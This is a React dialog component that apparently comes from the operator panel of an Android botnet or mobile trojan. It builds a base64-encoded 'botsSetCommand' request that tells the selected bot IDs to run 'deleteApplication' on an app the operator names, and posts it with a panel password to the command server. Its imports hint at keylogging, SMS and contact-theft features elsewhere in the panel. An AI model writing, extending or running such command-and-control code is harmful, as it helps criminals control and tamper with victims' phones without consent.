import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faLink } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';

import TextField from '@mui/material/TextField';

import { toast } from 'react-toastify';


export default function DelApp(props) {
    const { openPopup, setOpenPopup, selected} = props;
    const [data, setdata] = useState('');

      function SendCommand(data) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"' + 
                    'request":"botsSetCommand",' + 
                    '"idbot":"' + selected.join(',') + '",' + 
                    '"command":"' + new Buffer('{"name":"deleteApplication","app":"' + data + '"}').toString('base64') + '"' + 
                    ',"password":"' + SettingsContext.password + ' "}').toString('base64')
            }
        });
    }
    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faTrashCan}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Delete App</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>

                    <TextField onChange={()=> setdata(event.target.value)} sx={{mt: 3}} id="outlined-basic" label="APP" variant="outlined" fullWidth/>

                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                    <Button onClick={()=> {if (data != '') { SendCommand(data); setOpenPopup(false); setdata(''); toast.success("Send command to delete " + data) } else { toast.error("You need to enter a app before performing this action"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
}